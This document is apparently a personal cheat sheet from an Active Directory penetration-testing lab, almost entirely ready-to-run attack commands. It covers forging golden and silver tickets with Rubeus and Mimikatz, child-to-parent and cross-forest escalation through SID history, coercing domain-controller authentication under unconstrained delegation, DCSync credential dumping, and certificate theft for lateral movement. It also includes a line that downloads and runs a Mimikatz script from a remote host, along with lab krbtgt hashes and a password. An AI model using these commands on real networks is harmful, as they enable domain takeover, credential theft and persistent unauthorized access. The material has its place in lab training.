- Escalate privilege from child domain to parent domain using krbtgt hash
```
Invoke-Rubeus "golden /user:Administrator /id:500 /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /groups:513 /sids:S-1-5-21-2781415573-3701854478-2406986946-519 /aes256:5e3d2096abb01469a3b0350962b0c65cedbbc611c5eac6f3ef6fc1ffa58cacd5 /ptt"
#S-1-5-21-210670787-2521448726-163245708 is SID of US\
#S-1-5-21-2781415573-3701854478-2406986946-519 is SID of TECHCORP\Enterprise Admins
#5e3d2096abb01469a3b0350962b0c65cedbbc611c5eac6f3ef6fc1ffa58cacd5 is the aes hash of krbtgt account of us
dir \\techcorp-dc.TECHCORP.LOCAL\c$

[Rubeus.Program]::Main("golden /user:h4x /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /rc4:b0975ae49f441adc6b024ad238935af5 /sids:S-1-5-21-2781415573-3701854478-2406986946-519 /ptt".Split())
```

- Cross Forest attack using Unconstrained Delegation with TGTDelegation
```
#On a computer having unconstrained delegation different from DC
[Rubeus.Program]::Main("monitor  /interval:5 /nowrap".Split())

#for every DC of every domain of every forest
C:\AD\Tools\MS-RPRN.exe \\us-dc.us.techcorp.local \\us-web.us.techcorp.local
```

- Cross Forest attack, list share (if permission granted)
```
[Rubeus.Program]::Main("asktgt /user:Administrator /aes256:4e7ba210b76d807429e7ad8b210e103528dcf5db8b9de6b411bf593269955a6d /sid:S-1-5-21-3657428294-2017276338-1274645009  /domain:eu.local /opsec /force /createnetonly:C:\Windows\System32\cmd.exe /show /ptt".Split())

winrs -r:eu-dc.eu.local powershell
Invoke-Mimi -Command '"lsadump::dcsync /user:eu\euvendor$ /domain:eu.local" "exit"'

#rc4 for euvendor$ sid od eu.local
Invoke-Rubeus "silver /user:Administrator /ldap /service:krbtgt/eu.local /rc4:b0d780c0652fe6224468d7fc4134cddf /sid:S-1-5-21-3657428294-2017276338-1274645009 /nowrap"
Invoke-Rubeus "asktgs /service:CIFS/euvendor-dc.euvendor.local /dc:euvendor-dc.euvendor.local /ptt /ticket:doIFEzCCBQ..."
dir \\euvendor-dc.euvendor.local\eushare
```
- Cross Forest attack with SID history enabled
```
#Find forest trust havind "sid history enabled" misconfiguration 
Get-DomainTrustMapping | Where-Object { $_.TrustAttributes -match 'TREAT_AS_EXTERNAL' }

#Find  group where rid > 1000 on **euvendor.local**
Get-DomainGroup -domain euvendor.local | Where-Object { $_.objectsid -match '-100[1-9]$|-[1-9][0-9]{3,}$' } | select name,member,objectsid | fl

#rc4 for euvendor$, sidS of group found for where rid > 1000
Invoke-Rubeus "silver /user:Administrator /ldap /service:krbtgt/eu.local /rc4:b0d780c0652fe6224468d7fc4134cddf /sids:S-1-5-21-4066061358-3942393892-617142613-1103 /nowrap"

#for all in `get-domaincomputer -domain euvendor.local | select cn`, tyr to request tgs
Invoke-Rubeus "asktgs /service:http/euvendor-net.euvendor.local /dc:euvendor-dc.euvendor.local /ptt /ticket:doIFEzCCBQ..."
winrs -r:euvendor-net.euvendor.local cmd

```

- Golden ticket
```
#aeskey for krbtgt account sid for domain name (us)
[Rubeus.Program]::Main("golden /aes256:5e3d2096abb01469a3b0350962b0c65cedbbc611c5eac6f3ef6fc1ffa58cacd5 /ldap /sid:S-1-5-21-210670787-2521448726-163245708 /user:Administrator /printcmd".Split())
[Rubeus.Program]::Main("....command suggested....".Split())

#or

Invoke-Rubeus "golden /user:Administrator /domain:eu.local /sid:S-1-5-21-3657428294-2017276338-1274645009 /aes256:4e7ba210b76d807429e7ad8b210e103528dcf5db8b9de6b411bf593269955a6d /ptt"

winrs -r:us-dc cmd
[SafetyKatz.Program]::Main("'lsadump::lsa /patch' 'exit'".Split())

# or 
Invoke-Mimi -Command '"kerberos::golden /User:Administrator /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /aes256:5e3d2096abb01469a3b0350962b0c65cedbbc611c5eac6f3ef6fc1ffa58cacd5 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'

$sess = New-PSSession us-dc.us.techcorp.local
Enter-PSSession -Session $sess
iex(new-object system.net.webclient).downloadstring('http://192.168.100.34:8000/Invoke-Mimi.ps1')
Invoke-Mimi -Command " `"lsadump::lsa /patch`" `"sekurlsa::ekeys`" `"exit`"  "


```
- Lateral movement
```
#export certificate
[Rubeus.Program]::Main("asktgt /user:pawadmin /aes256:702b7c5c6e8d37f0a26261e69c5dc71d /opsec /force /createnetonly:C:\Windows\System32\cmd.exe /show /ptt".Split())
winrs -r:us-jump2 cmd
certutil -store My
certutil -exportpfx -p SecretPass@123 7700000028aaf066096eb80168000100000028 C:\Users\pawadmin\Downloads\pawadmin.pfx

#import certificate 
Invoke-Rubeus "asktgt /user:pawadmin /certificate:C:\AD\Tools\pawadmin.pfx /password:SecretPass@123 /nowrap /ptt"
exit
copy \\us-jump2.US.TECHCORP.LOCAL\c$\users\pawadmin\Downloads\pawadmin.pfx C:\AD\Tools\

```

- Forest Abuse
```
Get-DomainTrust -API
Get-DomainTrustMapping
Get-NetForestDomain | Get-NetDomainTrust 

Get-ADTrust 
Get-ADTrust -Filter {(ForestTransitive -eq $True) -and (SIDFilteringQuarantined -eq $False)}
```
- Find ACL for a user

```
function FindACLForUser($user){
    Get-DomainUser  | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object { $_ } | where-object{( ($_.ActiveDirectoryRights -like '*GenericAll*' -or ($_.ActiveDirectoryRights -like '*GenericWrite*') -or ($_.ActiveDirectoryRights -like '*WriteOwner*') -or ($_.ActiveDirectoryRights -like '*AddMember*') -or ($_.ActiveDirectoryRights -like '*WriteDACL*') -or ($_.ActiveDirectoryRights -like '*AllExtendedRights*') -or ($_.ActiveDirectoryRights -like '*ForceChangePassword*') -or ($_.ActiveDirectoryRights -like '*Self*') -or ($_.ActiveDirectoryRights -like '*ExtendedRight*' -and $_.ObjectAceType -like '*User-Force-Change-Password*') ) -and ($_.Identity -Like "*$user" )  )} | select AceQualifier, ObjectDN, ActiveDirectoryRights, ObjectAceType, Identity

    Get-DomainGroup  | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object { $_ } | where-object{( ($_.ActiveDirectoryRights -like '*GenericAll*' -or ($_.ActiveDirectoryRights -like '*GenericWrite*') -or ($_.ActiveDirectoryRights -like '*WriteOwner*') -or ($_.ActiveDirectoryRights -like '*AddMember*') -or ($_.ActiveDirectoryRights -like '*WriteDACL*') -or ($_.ActiveDirectoryRights -like '*AllExtendedRights*') -or ($_.ActiveDirectoryRights -like '*ForceChangePassword*') -or ($_.ActiveDirectoryRights -like '*Self*') -or ($_.ActiveDirectoryRights -like '*ExtendedRight*' -and $_.ObjectAceType -like '*User-Force-Change-Password*') ) -and ($_.Identity -Like "*$user" )  )} | select AceQualifier, ObjectDN, ActiveDirectoryRights, ObjectAceType, Identity

    Get-DomainComputer  | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object { $_ } | where-object{( ($_.ActiveDirectoryRights -like '*GenericAll*' -or ($_.ActiveDirectoryRights -like '*GenericWrite*') -or ($_.ActiveDirectoryRights -like '*WriteOwner*') -or ($_.ActiveDirectoryRights -like '*AddMember*') -or ($_.ActiveDirectoryRights -like '*WriteDACL*') -or ($_.ActiveDirectoryRights -like '*AllExtendedRights*') -or ($_.ActiveDirectoryRights -like '*ForceChangePassword*') -or ($_.ActiveDirectoryRights -like '*Self*') -or ($_.ActiveDirectoryRights -like '*ExtendedRight*' -and $_.ObjectAceType -like '*User-Force-Change-Password*') ) -and ($_.Identity -Like "*$user" )  )} | select AceQualifier, ObjectDN, ActiveDirectoryRights, ObjectAceType, Identity

    Get-DomainGroup -MemberIdentity studentuser34 | foreach{
    $groupname = $_.name
    
    Get-DomainUser  | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object { $_ } | where-object{( ($_.ActiveDirectoryRights -like '*GenericAll*' -or ($_.ActiveDirectoryRights -like '*GenericWrite*') -or ($_.ActiveDirectoryRights -like '*WriteOwner*') -or ($_.ActiveDirectoryRights -like '*AddMember*') -or ($_.ActiveDirectoryRights -like '*WriteDACL*') -or ($_.ActiveDirectoryRights -like '*AllExtendedRights*') -or ($_.ActiveDirectoryRights -like '*ForceChangePassword*') -or ($_.ActiveDirectoryRights -like '*Self*') -or ($_.ActiveDirectoryRights -like '*ExtendedRight*' -and $_.ObjectAceType -like '*User-Force-Change-Password*') ) -and ($_.Identity -Like "*$groupname" )  )} | select AceQualifier, ObjectDN, ActiveDirectoryRights, ObjectAceType, Identity

    Get-DomainGroup  | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object { $_ } | where-object{( ($_.ActiveDirectoryRights -like '*GenericAll*' -or ($_.ActiveDirectoryRights -like '*GenericWrite*') -or ($_.ActiveDirectoryRights -like '*WriteOwner*') -or ($_.ActiveDirectoryRights -like '*AddMember*') -or ($_.ActiveDirectoryRights -like '*WriteDACL*') -or ($_.ActiveDirectoryRights -like '*AllExtendedRights*') -or ($_.ActiveDirectoryRights -like '*ForceChangePassword*') -or ($_.ActiveDirectoryRights -like '*Self*') -or ($_.ActiveDirectoryRights -like '*ExtendedRight*' -and $_.ObjectAceType -like '*User-Force-Change-Password*') ) -and ($_.Identity -Like "*$groupname" )  )} | select AceQualifier, ObjectDN, ActiveDirectoryRights, ObjectAceType, Identity

    Get-DomainComputer  | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object { $_ } | where-object{( ($_.ActiveDirectoryRights -like '*GenericAll*' -or ($_.ActiveDirectoryRights -like '*GenericWrite*') -or ($_.ActiveDirectoryRights -like '*WriteOwner*') -or ($_.ActiveDirectoryRights -like '*AddMember*') -or ($_.ActiveDirectoryRights -like '*WriteDACL*') -or ($_.ActiveDirectoryRights -like '*AllExtendedRights*') -or ($_.ActiveDirectoryRights -like '*ForceChangePassword*') -or ($_.ActiveDirectoryRights -like '*Self*') -or ($_.ActiveDirectoryRights -like '*ExtendedRight*' -and $_.ObjectAceType -like '*User-Force-Change-Password*') ) -and ($_.Identity -Like "*$groupname" )  )} | select AceQualifier, ObjectDN, ActiveDirectoryRights, ObjectAceType, Identity
        }
}
```
- Bloodhound 
```
MATCH p = ( {owned: true})-[r1*1..]->(n)  RETURN p
MATCH p = ( {objectid: "S-1-5-21-210670787-2521448726-163245708-19124"})-[r1*1..]->(n)  RETURN p
MATCH p = ( {owned: true, objectid: "S-1-5-21-210670787-2521448726-163245708-8602"})-[r1*1..]->(n)  RETURN p
MATCH p = (g1:User {owned: true})-[r1*1..]->(n)  RETURN p
MATCH p = (g1:Group {owned: true})-[r1*1..]->(n)  RETURN p
MATCH p = (g1:Computer {owned: true})-[r1*1..]->(n)  RETURN p
MATCH (n) WHERE NOT n.objectid="S-1-5-21-210670787-2521448726-163245708-19124" MATCH p=shortestPath((u:User {objectid: "S-1-5-21-210670787-2521448726-163245708-19124"})-[r1*1..]->(n)) RETURN p
MATCH p = (g1:Group {objectid: "S-1-5-21-210670787-2521448726-163245708-1116"})-[r1*1..]->(n)  RETURN p
```

MATCH p = (g1:User {objectid: "S-1-5-21-210670787-2521448726-163245708-19124"})-[r1*1..]->(n)  RETURN p
MATCH p = (g1:User {owned: true})-[r1*1..]->(n)  RETURN p
MATCH (n:User {objectid: "S-1-5-21-210670787-2521448726-163245708-19124"}), (m {owned: true}), p=shortestPath((m)-[r*1..]->(n)) WHERE NOT m=n RETURN p
```